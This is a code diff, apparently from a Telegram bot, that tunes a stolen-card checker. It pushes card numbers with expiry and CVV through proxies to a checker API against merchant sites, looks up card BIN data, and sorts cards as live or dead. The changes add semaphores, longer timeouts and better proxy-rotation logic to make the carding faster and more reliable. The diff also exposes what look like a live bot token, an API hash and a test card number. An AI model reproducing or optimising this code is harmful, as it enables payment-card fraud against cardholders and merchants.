@@ -20,7 +20,7 @@ API_HASH = 'c9ee8df29903caf150937299f97703e2'
 BOT_TOKEN = '8145446640:AAEiIDCzyoDlaf2NICb_TRz-x1SG8jffMc8'
 
 WORKERS = 30
-DELAY = 0.01  
+DELAY = 0.5
 
 PREMIUM_FILE = 'premium.txt'
 SITES_FILE = 'sites.txt'
@@ -108,14 +108,20 @@ _DEAD_INDICATORS = (
 )
 
 # =========================================================================
-# الجلسة الموحدة
+# الجلسة الموحدة ومنظم المرور (The New Engine)
 # =========================================================================
 _global_session = None
+api_semaphore = asyncio.Semaphore(15) 
 
 async def get_session():
     global _global_session
     if _global_session is None or _global_session.closed:
-        connector = aiohttp.TCPConnector(limit=100, ssl=False, force_close=True) 
+        connector = aiohttp.TCPConnector(
+            limit=200, 
+            limit_per_host=30, 
+            ssl=False, 
+            enable_cleanup_closed=True
+        ) 
         _global_session = aiohttp.ClientSession(connector=connector)
     return _global_session
 # =========================================================================
@@ -149,7 +155,6 @@ def is_dead_site_error(error_msg):
 async def get_bin_info(card_number):
     try:
         bin_number = card_number[:6]
-        # تمت زيادة المهلة إلى 10 ثواني (5 للاتصال)
         timeout = aiohttp.ClientTimeout(total=10, connect=5)
         session = await get_session()
         async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=timeout) as res:
@@ -180,14 +185,15 @@ async def check_card(card, site, proxy):
 
         params = {'cc': card, 'url': site, 'proxy': proxy}
         
-        # --- التعديل: السماح بـ 7 ثواني للاتصال، و 20 ثانية كحد أقصى للرد ---
-        timeout = aiohttp.ClientTimeout(total=20, connect=7)
+        timeout = aiohttp.ClientTimeout(total=28, connect=8, sock_read=20)
         
         session = await get_session() 
-        async with session.get(CHECKER_API_URL, params=params, timeout=timeout) as resp:
-            if resp.status in [502, 503, 504, 429]:
-                 return {'status': 'Site Error', 'message': f'API Congested ({resp.status})', 'card': card, 'retry': True, 'proxy': proxy}
-            raw = await resp.json(content_type=None)
+        
+        async with api_semaphore:
+            async with session.get(CHECKER_API_URL, params=params, timeout=timeout) as resp:
+                if resp.status in [502, 503, 504, 429]:
+                     return {'status': 'Site Error', 'message': f'API Congested ({resp.status})', 'card': card, 'retry': True, 'proxy': proxy}
+                raw = await resp.json(content_type=None)
 
         response_msg = raw.get('Response', '')
         price = raw.get('Price', '-')
@@ -218,9 +224,9 @@ async def check_card(card, site, proxy):
             return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
 
     except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'API Timeout (Proxy Slow)', 'card': card, 'retry': True, 'proxy': proxy}
-    except aiohttp.ClientError:
-        return {'status': 'Site Error', 'message': 'Connection Dropped', 'card': card, 'retry': True, 'proxy': proxy}
+        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True, 'proxy': proxy}
+    except aiohttp.ClientConnectorError:
+        return {'status': 'Site Error', 'message': 'Proxy Connection Dropped', 'card': card, 'retry': True, 'proxy': proxy}
     except Exception:
         return {'status': 'Site Error', 'message': 'API Error', 'card': card, 'retry': True, 'proxy': proxy}
 
@@ -244,12 +250,13 @@ async def check_card_with_retry(card, sites, proxies, max_retries=5):
         last_result = result
         msg_lower = str(result.get('message', '')).lower()
 
-        if any(x in msg_lower for x in ['proxy', 'timeout', 'connection', 'dropped', 'error']):
-            if proxy in available_proxies: available_proxies.remove(proxy)
+        if 'proxy connection dropped' in msg_lower or 'bad proxy' in msg_lower:
+            if proxy in available_proxies: 
+                available_proxies.remove(proxy)
 
         if attempt < max_retries - 1:
             if 'congested' in msg_lower or 'timeout' in msg_lower:
-                await asyncio.sleep(random.uniform(1.0, 2.5))
+                await asyncio.sleep(random.uniform(2.0, 4.0)) 
             else:
                 await asyncio.sleep(DELAY) 
 
@@ -298,7 +305,6 @@ Proxy  ›  <code>{proxy}</code> {E_PROXY}"""
 
     gif_file_obj = None
     try:
-        # تمت زيادة المهلة إلى 10 ثواني (5 للاتصال) لجلب الصورة
         timeout = aiohttp.ClientTimeout(total=10, connect=5)
         session = await get_session() 
         async with session.get(random_gif_url, timeout=timeout) as resp:
@@ -403,7 +409,6 @@ async def send_final_results(user_id, results):
 async def test_site(site, proxy):
     try:
         params = {'cc': "5154623245618097|03|2032|156", 'url': site, 'proxy': proxy}
-        # تمت زيادة مهلة فحص الموقع إلى 20 ثانية
         timeout = aiohttp.ClientTimeout(total=20)
         session = await get_session()
         async with session.get(CHECKER_API_URL, params=params, timeout=timeout) as resp:
@@ -421,7 +426,6 @@ async def test_proxy(proxy):
         elif len(parts) == 2: proxy_url = f"http://{parts[0]}:{parts[1]}"
         else: proxy_url = f"http://{proxy_url}"
     try:
-        # تمت زيادة مهلة فحص البروكسي إلى 10 ثواني حتى لا يحذف بروكسيات بطيئة تعمل
         timeout = aiohttp.ClientTimeout(total=10)
         session = await get_session() 
         async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=timeout) as resp:
